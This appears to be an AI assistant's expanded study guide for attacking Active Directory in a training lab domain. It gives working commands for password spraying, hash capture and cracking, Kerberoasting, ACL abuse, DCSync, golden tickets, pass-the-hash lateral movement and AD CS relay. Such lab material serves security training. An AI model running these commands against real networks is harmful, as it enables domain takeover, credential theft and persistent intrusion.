Of course. Here is an even more comprehensive and extended guide, built upon your command list. This version includes a significantly deeper dive into ACL exploitation, more attack variations, and detailed explanations for a complete, step-by-step methodology.

-----

## Phase 1: External Reconnaissance (OSINT) üïµÔ∏è

The objective of this initial, non-intrusive phase is to gather as much public information about the target as possible to inform the next stages of the attack.

  * **Methodology**: Utilize public records, search engines, social media, and data breach aggregators. The goal is to build a profile of the organization's external infrastructure and its employees, which can reveal potential usernames, email formats, and previously compromised credentials.
  * **What to look for**: Domain names, subdomains, IP ranges, employee names and titles, email address formats (e.g., `f.lastname@inlanefreight.com`), technology stacks in use (e.g., `inurl:wp-admin`), and any credentials found in public data breaches.

<!-- end list -->

```shell
# Use online tools for comprehensive DNS and domain information gathering.
viewdns.info

# Perform DNS lookups to find mail servers (MX), name servers (NS), and IP addresses (A records).
nslookup -type=any inlanefreight.com

# Scrape professional networking sites like LinkedIn to build a list of employee names.
# These names are the raw material for generating potential usernames.
linkedin2username

# Use advanced Google Dorking to find sensitive documents, login pages, or error messages that leak internal information.
filetype:pdf inurl:inlanefreight.com confidential
intext:"@inlanefreight.com" "password"
inurl:vpn.inlanefreight.com

# Check data breach repositories like Dehashed. A single leaked password can often be reused or provide clues to password patterns.
sudo python3 dehashed.py -q inlanefreight.local -p
```

-----

## Phase 2: Initial Internal Enumeration & Network Mapping üó∫Ô∏è

Once you have a foothold on the internal network (e.g., via a phishing link, Wi-Fi access, or a vulnerable external server), the first priority is to understand the local network environment and locate the Domain Controllers.

  * **Methodology**: Combine passive traffic sniffing with active network scanning. Passive discovery is stealthy and can reveal hosts communicating on the network. Active scanning is louder but provides a more complete picture of live hosts, open ports, and running services.
  * **What to look for**: The internal domain name (e.g., `INLANEFREIGHT.LOCAL`), IP addresses of Domain Controllers (which host DNS, Kerberos, LDAP), live workstations and servers, and key services like SMB (`445`), WinRM (`5985`), RDP (`3389`), and LDAP (`389`).

<!-- end list -->

```shell
# Passively sniff the network with Wireshark or tcpdump. Look for broadcast traffic like ARP and NBNS,
# DNS queries pointing to DCs, and Kerberos TGT requests.
sudo -E wireshark
sudo tcpdump -i ens224 -n 'port 53 or port 88 or port 389'

# Use Responder in analyze-only mode (-A) to identify hosts without actively poisoning them.
# This is a great way to discover hosts that are misconfigured to use LLMNR/NBT-NS.
sudo responder -I ens224 -A

# Use a fast ping sweep to build an initial list of live hosts.
fping -asgq 172.16.5.0/23 > hosts.txt

# Run a detailed Nmap scan on the discovered hosts. The -A flag enables OS detection, version detection,
# script scanning, and traceroute. This is your primary tool for mapping services.
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum

# Run a more aggressive scan across the entire subnet for a complete picture, outputting in Grepable format.
sudo nmap -A -Pn -T5 -oG ./nmapOutput 172.16.5.0/23
```

-----

## Phase 3: Unauthenticated Attacks & Enumeration üëÇ

Before obtaining credentials, you can still extract a vast amount of information from an Active Directory environment. This phase focuses on exploiting anonymous access and legacy protocols.

  * **Methodology**: Poison legacy name resolution protocols to capture hashes. Probe services like SMB, RPC, and LDAP for information that can be accessed via "null sessions" (anonymous binds). Systematically test a list of potential usernames against the domain's Kerberos service to validate them without triggering failed login alerts.
  * **What to look for**: NTLMv2 hashes to crack offline, a validated list of domain usernames, and the domain's password policy (length, complexity, lockout threshold).

### LLMNR/NBT-NS Poisoning

```shell
# From Linux, run Responder to capture hashes. Any Windows host that can't resolve a name via DNS may fall back to LLMNR/NBT-NS, sending its hash to you.
sudo responder -I ens224

# From Windows, use Inveigh. It provides similar functionality to Responder.
Import-Module .\Inveigh.ps1
Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y

# Use Hashcat (mode 5600 for NTLMv2) to crack the captured hash.
hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
```

### Unauthenticated User, Share, & Policy Enumeration

```shell
# Connect to the RPC service with a null session to query domain info, users, and groups.
rpcclient -U "" -N 172.16.5.5
# Inside rpcclient prompt:
> querydominfo
> enumdomusers
> enumdomgroups

# Use enum4linux-ng for a comprehensive automated sweep of null-session enumeration.
enum4linux-ng -A 172.16.5.5 -oA ilfreight

# Use ldapsearch with an anonymous bind (-x) to query the entire directory.
# This can reveal usernames, descriptions, groups, and computer objects.
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=user)" sAMAccountName
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" "(objectClass=group)" cn

# On Windows, establish a null session with `net use` and query the password policy.
net use \\DC01\ipc$ "" /u:""
net accounts
```

### Username Validation

```shell
# Prepare and move the Kerbrute binary into your PATH for easy execution.
sudo git clone https://github.com/ropnop/kerbrute.git && cd kerbrute && sudo make all
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Use Kerbrute with a generated wordlist to validate usernames. This is stealthy as it doesn't trigger
# failed logon events in the security logs for non-existent users.
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 potential_users.txt -o valid_users.txt

# Extract just the usernames from the output for use in other tools.
awk '/VALID USERNAME/ {print $7}' valid_users.txt | cut -d '@' -f 1 > valid_users_short.txt
```

-----

## Phase 4: Gaining Initial Access üîë

With a validated list of usernames and knowledge of the password policy, the goal is to obtain at least one valid set of credentials.

  * **Methodology**: Primarily involves **Password Spraying** (testing a single, common password against many users) and **AS-REP Roasting** (exploiting users who don't require Kerberos pre-authentication).
  * **What to look for**: A successful authentication event, which provides the first foothold into the domain as a legitimate user.

### Password Spraying

```shell
# Use CrackMapExec to spray a password over SMB. The --continue-on-success flag is useful for large lists.
# Look for "(Pwned!)" in the output. Common passwords to try are based on seasons and years (e.g., 'Winter2025', 'Summer2025!').
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p 'Welcome123!' --continue-on-success

# Use Kerbrute for a stealthier spray over Kerberos.
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt 'Password123'

# On Windows, use a dedicated PowerShell tool.
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Summer2025!' -OutFile spray_success -ErrorAction SilentlyContinue
```

### AS-REP Roasting

```shell
# Use GetNPUsers.py to request hashes for users vulnerable to AS-REP Roasting.
# This requires a list of valid usernames to test.
GetNPUsers.py INLANEFREIGHT.LOCAL/ -usersfile valid_users.txt -format hashcat -outputfile asrep_hashes.txt

# On Windows, you can query for vulnerable users directly with an authenticated account.
# With no account, you must provide a user list just like with GetNPUsers.
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
Get-DomainUser -PreauthNotRequired # (Requires authentication)

# Crack the obtained hash (mode 18200) with Hashcat.
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

-----

## Phase 5: Authenticated Enumeration & Situational Awareness üïµÔ∏è‚Äç‚ôÄÔ∏è

With a valid user account, the entire domain becomes visible. This is a critical intelligence-gathering phase to map out paths to privilege escalation.

  * **Methodology**: The gold standard is using **BloodHound**, which collects AD data and visualizes relationships and attack paths. Complement this with tools like `CrackMapExec` and `Snaffler` to scan for active sessions and sensitive files. On a compromised host, use "Living off the Land" Binaries and Scripts (LOLBAS) to gather local intelligence.
  * **What to look for**: High-privilege group memberships, abusable ACLs, systems where privileged users are logged in, sensitive files on network shares (passwords in scripts, backups, config files), and accounts with dangerous settings like Unconstrained Delegation.

### "Living Off the Land" (Post-Compromise Host Enumeration)

```powershell
# Check for security products and PowerShell constraints.
Get-MpComputerStatus
sc query windefend
$ExecutionContext.SessionState.LanguageMode

# Enumerate local and domain context.
qwinsta # Who else is logged in?
net group /domain
net user wrouse /domain
net localgroup Administrators

# Use the powerful dsquery for targeted AD searches from the command line.
dsquery user -name "admin*" # Find users with 'admin' in their name
dsquery computer -inactive 4 # Find computers inactive for 4 weeks
# Find users with Unconstrained Delegation (a very dangerous permission)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=524288)" -limit 0 -attr sAMAccountName
```

### Credentialed Domain Enumeration

```shell
# Use BloodHound to collect and visualize AD data. This is the single most effective way to find attack paths.
# Linux Collector:
sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
# Windows Collector:
.\SharpHound.exe -c All --zipfilename ILFREIGHT.zip

# Use CrackMapExec with credentials to find active sessions, accessible shares, and local admins across the network.
sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2 --sessions
sudo crackmapexec smb 172.16.5.0/23 -u forend -p Klmcargo2 --local-auth --users administrator

# Use Snaffler to recursively hunt for sensitive files on all readable shares.
Snaffler.exe -s -d inlanefreight.local -u forend -p Klmcargo2 -o snaffler.log -v

# On Windows, use PowerView for highly detailed, granular AD queries.
Import-Module .\PowerView.ps1
Get-DomainUser -Identity mmorgan -Properties *
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-NetSession -ComputerName DC01
Find-InterestingDomainAcl -ResolveGUIDs
```

-----

## Phase 6: Privilege Escalation üöÄ

This is the core of the attack, where you leverage the information from enumeration to elevate your privileges, with the goal of becoming a Domain Admin.

### Kerberoasting

An attack against user accounts that are running services (e.g., a SQL server service account). These accounts have Service Principal Names (SPNs). Any authenticated user can request a service ticket (TGS) for these services. The ticket is encrypted with the service account's password hash, which can be cracked offline.

  * **Methodology**: First, find users with SPNs. Second, request a service ticket for one of these SPNs. Third, extract the hash from the ticket. Fourth, crack the hash.
  * **What to look for**: User accounts (not computer accounts) with SPNs, as these are more likely to have weak, human-set passwords.

<!-- end list -->

```shell
# Linux: Use GetUserSPNs.py to find and request tickets in one step.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Windows: Use Rubeus for powerful and flexible Kerberoasting.
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt /format:hashcat

# Alternatively, find SPNs with PowerView and request the ticket.
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat

# Crack the TGS hash (mode 13100) with Hashcat.
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### In-Depth ACL Exploitation

This is one of the most common paths to privilege escalation. An Access Control List (ACL) is a set of permissions on an object. Misconfigurations can allow a low-privilege user to take control of a high-privilege object (like the Domain Admins group).

  * **Methodology**: Systematically find dangerous permissions (`GenericAll`, `WriteDacl`, `WriteProperty`, etc.) that your compromised user has over other users, groups, or GPOs. Then, use those permissions to escalate.
  * **What to look for**: Any "Write" or "All" permission your user has over a more privileged object. BloodHound is excellent at visualizing these paths.

| **Permission / Right** | **Description & Impact** | **How to Find (PowerView)** | **How to Exploit** |
| :--- | :--- | :--- | :--- |
| **GenericAll** | Total control. You can modify permissions, members, and properties. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "GenericAll")}` | `Add-DomainGroupMember -Identity <TargetGroup> -Members <YourUser>` |
| **WriteDacl** | You can change the permissions of the object. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "WriteDacl")}` | 1. Use `Set-DomainObjectAcl` to grant yourself `GenericAll`. 2. Exploit with `GenericAll`. |
| **WriteOwner** | You can take ownership of the object. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "WriteOwner")}` | 1. Use `Set-DomainObjectOwner` to take ownership. 2. Use `WriteDacl` to grant `GenericAll`. 3. Exploit. |
| **WriteProperty** | You can modify attributes. If you can modify the `member` attribute of a group, you win. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "WriteProperty")}` | `Add-DomainGroupMember -Identity <TargetGroup> -Members <YourUser>` |
| **Self-membership** | The user/group has the explicit right to add itself to the target group. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "Self")}` | `Add-DomainGroupMember -Identity <TargetGroup> -Members <YourUser>` |
| **ForceChangePassword** | You can reset a target user's password without knowing their current one. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ObjectType -match "User-Force-Change-Password")}` | `Set-DomainUserPassword -Identity <TargetUser> -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)` |
| **AllExtendedRights** | A wildcard for all special "extended rights," which can include ForceChangePassword. | `Find-InterestingDomainAcl -ResolveGUIDs \| ?{($_.ActiveDirectoryRights -match "ExtendedRight")}` | Depends on the specific right. If it includes ForceChangePassword, use that exploit. |

-----

## Phase 7: Domain Dominance & Persistence üëë

This is the endgame: achieving full, persistent control over the Active Directory domain.

  * **Methodology**: The most direct path is abusing an account with **DCSync** rights. This allows you to impersonate a Domain Controller and request password data for any account. Once you have the hash for the `krbtgt` account, you can create **Golden Tickets** and remain hidden in the domain for years.
  * **What to look for**: An account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` permissions, and the NTLM hash of the `krbtgt` account.

### DCSync

```shell
# From a compromised host, find users with DCSync rights using PowerView.
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get-Changes')}

# From Linux, use secretsdump.py. This is the simplest way to get all hashes.
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# From Windows, use mimikatz. The classic and most powerful tool.
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv" "exit"
```

### Golden Tickets

Once you have the `krbtgt` hash from DCSync, you can create golden tickets, which are valid Kerberos tickets that let you impersonate *any* user.

```shell
# From Linux, use ticketer.py.
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain INLANEFREIGHT.LOCAL administrator
export KRB5CCNAME=administrator.ccache # Use the ticket

# From Windows, use mimikatz. The /ptt flag injects the ticket directly into memory.
mimikatz # kerberos::golden /user:administrator /domain:inlanefreight.local /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt
```

-----

## Phase 8: Lateral Movement & Cross-Trust Attacks ‚û°Ô∏è

With high privileges, you can move freely across the network and pivot into other trusted domains.

  * **Methodology**: Use your compromised credentials (passwords, hashes, or Kerberos tickets) to authenticate to other machines via SMB, WinRM, or WMI. For trusts, enumerate them and use your privileged position to access resources in the foreign domain.
  * **What to look for**: Local admin access on servers and workstations, interesting data on other machines, and trust relationships that can be abused.

### Lateral Movement Techniques

```shell
# Use evil-winrm (WinRM) or Enter-PSSession for clean, interactive shells.
evil-winrm -i 10.129.201.234 -u forend -p <password>
Enter-PSSession -ComputerName DC02 -Credential (Get-Credential)

# Use impacket's suite for remote command execution.
psexec.py INLANEFREIGHT/administrator@DC02 -hashes <lm_hash>:<ntlm_hash>
wmiexec.py INLANEFREIGHT/administrator@DC02 -hashes <lm_hash>:<ntlm_hash>

# Pass-the-Ticket (PtT) with a stolen or forged ticket.
export KRB5CCNAME=ticket.ccache # Use a ticket obtained via Rubeus monitor or a golden ticket
psexec.py -k -no-pass INLANEFREIGHT/administrator@DC02
```

### Attacking Domain Trusts

```shell
# Enumerate trusts from Windows.
Get-ADTrust -Filter *
Get-DomainTrustMapping

# If you are DA in one domain, you can often use those credentials to access systems in a trusted domain.
Enter-PSSession -ComputerName FOREIGN-DC.FOREIGN.LOCAL -Credential INLANEFREIGHT\administrator

# If a trust key is known, you can forge inter-realm trust tickets.
mimikatz # lsadump::trust /patch
```

-----

## Phase 9: Advanced & "Bleeding Edge" Attacks ü©∏

This covers modern vulnerabilities and advanced techniques that can lead to rapid compromise if the environment is unpatched or misconfigured.

  * **Methodology**: Scan for specific unpatched CVEs like **noPac** or **PrintNightmare**, and exploit misconfigurations in Active Directory Certificate Services (AD CS), which is an increasingly common attack vector.
  * **What to look for**: Vulnerable services, weak certificate templates (especially those that allow arbitrary SANs or are published for easy enrollment), and patch levels.

### AD CS (Certificate Services) Abuse

AD CS is often misconfigured. Tools like `Certify` and `Certipy` can find and exploit these flaws.

```shell
# Use Certipy to find vulnerable templates and other misconfigurations.
certipy find -u 'forend@inlanefreight.local' -p 'Klmcargo2' -dc-ip 172.16.5.5 -stdout

# If a vulnerable template is found (e.g., ESC1), request a certificate as an administrator.
certipy req -u 'forend@inlanefreight.local' -p 'Klmcargo2' -ca 'INLANEFREIGHT-CA' -template 'VulnerableTemplate' -upn 'administrator@inlanefreight.local'

# Use the generated certificate to authenticate and get a hash.
certipy auth -pfx administrator.pfx -dc-ip 172.16.5.5
```

### AD CS Relay (PetitPotam)

Force a DC to authenticate to you via HTTP, relay that authentication to AD CS, and get a certificate for the DC's computer account.

```shell
# 1. Start ntlmrelayx to relay to the AD CS web enrollment page.
sudo ntlmrelayx.py -t http://<adcs_server>/certsrv/certfnsh.asp --adcs --template DomainController

# 2. Use PetitPotam to coerce the DC to authenticate to your relay.
python3 PetitPotam.py <your_relay_ip> <dc_ip>

# 3. ntlmrelayx will receive the auth, get a cert, and dump the DC's hash.
```
